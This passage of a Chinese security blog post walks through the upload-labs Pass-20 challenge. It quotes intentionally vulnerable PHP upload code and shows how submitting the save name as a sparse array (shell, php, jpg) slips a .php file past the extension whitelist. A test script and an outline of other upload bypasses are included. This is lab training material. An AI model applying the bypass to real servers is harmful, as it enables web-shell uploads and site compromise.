+    $allow_type = array(&#39;image/jpeg&#39;,&#39;image/png&#39;,&#39;image/gif&#39;);
+    if(!in_array($_FILES[&#39;upload_file&#39;][&#39;type&#39;],$allow_type))&#123;
+        $msg = &quot;禁止上传该类型文件!&quot;;
+    &#125;else&#123;
+        //检查文件名
+        $file = empty($_POST[&#39;save_name&#39;]) ? $_FILES[&#39;upload_file&#39;][&#39;name&#39;] : $_POST[&#39;save_name&#39;];
+        if (!is_array($file)) &#123;
+            $file = explode(&#39;.&#39;, strtolower($file));
+        &#125;
+
+        $ext = end($file);
+        $allow_suffix = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);
+        if (!in_array($ext, $allow_suffix)) &#123;
+            $msg = &quot;禁止上传该后缀文件!&quot;;
+        &#125;else&#123;
+            $file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];
+            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+            $img_path = UPLOAD_PATH . &#39;/&#39; .$file_name;
+            if (move_uploaded_file($temp_file, $img_path)) &#123;
+                $msg = &quot;文件上传成功！&quot;;
+                $is_upload = true;
+            &#125; else &#123;
+                $msg = &quot;文件上传失败！&quot;;
+            &#125;
+        &#125;
+    &#125;
+&#125;else&#123;
+    $msg = &quot;请选择要上传的文件！&quot;;
+&#125;</code></pre>
+<p>先检查MIME，通过后检查文件名，保存名称为空的就用上传的文件名。再判断文件名是否是array数组，不是的话就用explode()函数通过.号分割成数组。然后获取最后一个，也就是后缀名，进行白名单验证。不符合就报错，符合就拼接数组的第一个和最后一个作为文件名，保存。</p>
+<pre><code>explode(string $delimiter , string $string [, int $limit])//返回由字符串组成的数组，每个元素都是string的一个子串，它们被字符串delimiter作为边界点分割出来 
+reset(array &amp;$array)//将数组的内部指针指向第一个单元
+end() 把数组内部指针移动到数组最后一个元素，并返回值。
+count()函数数组元素的数量。</code></pre>
+<p>通过$file_name = reset($file) . ‘.’ . $file[count($file) - 1];可以知道最终的文件名是由数组的第一个和最后一个元素拼接而成。如果是正常思维来讲，无论如何都是没有办法绕过的，但是有个地方给了一个提示。</p>
+<pre><code>if (!is_array($file)) &#123;
+    $file = explode(&#39;.&#39;, strtolower($file));
+&#125;</code></pre>
+<p>这里有个判断，如果不是数组，就自己拆成数组，也就是说，我们是可以自己传数组进入的。</p>
+<p>如果第一个元素是reset()，最后一个元素是end()，讲道理 $file[count($file)-1] 也就是最后一个，但是为什么不直接使用end()呢</p>
+<p>也就是说有特殊的情况下，这两个东西是不等的，其实就是这样的一个数组</p>
+<p>$array=([0]-&gt;’shell’ [2]-&gt;’php’ [3]-&gt;’jpg’)</p>
+<p>测试代码</p>
+<pre><code>&lt;?php
+$file = array();
+$file[0] = &#39;shell&#39;;
+$file[2] = &#39;php&#39;;
+$file[3] = &#39;jpg&#39;;
+print_r($file);
+echo &quot;数组总元素个数为&quot;.count($file);
+?&gt;</code></pre>
+<p>运行结果</p>
+<pre><code>Array
+(
+    [0] =&gt; shell
+    [2] =&gt; php
+    [3] =&gt; jpg
+)
+数组总元素个数为3</code></pre>
+<p>绕过姿势：</p>
+<p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/Screenshot%20from%202021-05-21%2001-56-52.png"></p>
+<h2 id="部分相关函数说明"><a href="#部分相关函数说明" class="headerlink" title="部分相关函数说明"></a>部分相关函数说明</h2><pre><code>$_FILES[&#39;file&#39;][&#39;name&#39;] //客户端上传的文件原名称，含扩展名
+$_FILES[&#39;file&#39;][&#39;type&#39;] //上传的文件类型
+$_FILES[&#39;file&#39;][&#39;tmp_name&#39;] //文件上传后，在服务器端存储的临时文件名
+stripos(string $haystack,string $needle [,int $offset = 0])// 查找字符串首次出现的位置（不区分大小写）
+strrpos(string $haystack,string $needle [,int $offset = 0])//计算指定字符串在目标字符串中最后一次出现的位置
+move_uploaded_file(string $filename,string $destination) //文件上传后先存储于服务器的临时目录中，使用该函数移动文件位置
+substr(string $string,int $start [,int $length]) //返回字符串string中从位置start处后的长度为length部分
+strrchr(string $haystack,mixed $needle) //返回haystack字符串中的一部分，这部分以needle的最后出现位置开始，直到haystack末尾
+in_array(mixed $needle,array $haystack[,bool $strict = FALSE])//在数组haystack中搜索是否存在值needle，strict若设置TRUE，则类型也会匹配</code></pre>
+<h2 id="Web渗透之文件上传漏洞总结"><a href="#Web渗透之文件上传漏洞总结" class="headerlink" title="Web渗透之文件上传漏洞总结"></a>Web渗透之文件上传漏洞总结</h2><p><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/95987.html">https://www.secpulse.com/archives/95987.html</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">MambaInVeins</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://mambainveins.gitee.io/mambainveins/2021/05/14/2021/2021-05-14-upload_labs/">http://mambainveins.gitee.io/mambainveins/2021/05/14/2021/2021-05-14-upload_labs/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://mambainveins.gitee.io/mambainveins" target="_blank">MambaInVeins Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E/">漏洞</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0142.png" data-sites="wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏<div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/blogpublic/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/blogpublic/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/blogpublic/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/blogpublic/alipay.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/05/14/2021/2021-05-14-burpsuite_localhost/"><img class="prev-cover" src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0187.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">burpsuite不能拦截本地包</div></div></a></div><div class="next-post pull-right"><a href="/2021/05/13/2021/2021-05-13-django_CVE-2019-14234/"><img class="next-cover" src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0156.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">基于vulhub复现Django JSONField SQL注入漏洞（CVE-2019-14234）</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/05/13/2021/2021-05-13-django_CVE-2019-14234/" title="基于vulhub复现Django JSONField SQL注入漏洞（CVE-2019-14234）"><img class="cover" src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0156.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-05-13</div><div class="title">基于vulhub复现Django JSONField SQL注入漏洞（CVE-2019-14234）</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">文件上传漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%83%E4%B9%A0%E5%B9%B3%E5%8F%B0-upload-labs"><span class="toc-number">1.1.</span> <span class="toc-text">练习平台 upload-labs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">1.2.</span> <span class="toc-text">参考链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-01-%E5%AE%A2%E6%88%B7%E7%AB%AFjs%E6%A3%80%E6%9F%A5"><span class="toc-number">1.3.</span> <span class="toc-text">Pass-01 客户端js检查</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-02-MIME-Type%E9%AA%8C%E8%AF%81"><span class="toc-number">1.4.</span> <span class="toc-text">Pass-02 MIME-Type验证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-03-%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%EF%BC%8C%E5%90%8E%E7%BC%80%E5%90%8D"><span class="toc-number">1.5.</span> <span class="toc-text">Pass-03 黑名单验证，后缀名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-04-%E9%BB%91%E5%90%8D%E5%8D%95-htaccess%E7%BB%95%E8%BF%87"><span class="toc-number">1.6.</span> <span class="toc-text">Pass-04 黑名单 .htaccess绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-05-%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">1.7.</span> <span class="toc-text">Pass-05 大小写绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-06-%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-number">1.8.</span> <span class="toc-text">Pass-06 空格绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-07-%E7%82%B9%E7%BB%95%E8%BF%87"><span class="toc-number">1.9.</span> <span class="toc-text">Pass-07 点绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-08-DATA%E7%BB%95%E8%BF%87"><span class="toc-number">1.10.</span> <span class="toc-text">Pass-08 ::$DATA绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-09-%E7%82%B9%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-number">1.11.</span> <span class="toc-text">Pass-09 点空格绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-10-%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">1.12.</span> <span class="toc-text">Pass-10 双写绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-11-00%E6%88%AA%E6%96%AD-get%E4%BC%A0%E8%BE%93"><span class="toc-number">1.13.</span> <span class="toc-text">Pass-11 %00截断 get传输</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-12-00%E6%88%AA%E6%96%AD-post%E4%BC%A0%E8%BE%93"><span class="toc-number">1.14.</span> <span class="toc-text">Pass-12 %00截断 post传输</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-13-%E5%9B%BE%E7%89%87%E9%A9%AC-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%A9%E7%94%A8"><span class="toc-number">1.15.</span> <span class="toc-text">Pass-13 图片马 文件包含利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-14-%E5%9B%BE%E7%89%87%E9%A9%AC-getimagesize-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%A9%E7%94%A8"><span class="toc-number">1.16.</span> <span class="toc-text">Pass-14 图片马 getimagesize() 文件包含利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-15-%E5%9B%BE%E7%89%87%E9%A9%AC-exif-imagetype-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%A9%E7%94%A8"><span class="toc-number">1.17.</span> <span class="toc-text">Pass-15 图片马 exif_imagetype() 文件包含利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-16-%E5%9B%BE%E7%89%87%E9%A9%AC-%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87"><span class="toc-number">1.18.</span> <span class="toc-text">Pass-16 图片马 二次渲染绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-17-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-number">1.19.</span> <span class="toc-text">Pass-17 条件竞争</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-18-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-number">1.20.</span> <span class="toc-text">Pass-18 条件竞争</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-19-%E7%BB%95%E8%BF%87"><span class="toc-number">1.21.</span> <span class="toc-text">Pass-19 &#x2F;.绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-20-%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87"><span class="toc-number">1.22.</span> <span class="toc-text">Pass-20 数组绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%83%A8%E5%88%86%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0%E8%AF%B4%E6%98%8E"><span class="toc-number">1.23.</span> <span class="toc-text">部分相关函数说明</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web%E6%B8%97%E9%80%8F%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93"><span class="toc-number">1.24.</span> <span class="toc-text">Web渗透之文件上传漏洞总结</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url(https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0142.png)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By MambaInVeins</div><div class="footer_custom_text"><a href="http://mambainveins.gitee.io/">Mamba Never Out</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script>(function(){
+  const bp = document.createElement('script');
+  const curProtocol = window.location.protocol.split(':')[0];
+  if (curProtocol === 'https') {
+    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else{
+    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+  bp.dataset.pjax = ''
+  const s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(bp, s);
+})()</script></div></body></html>
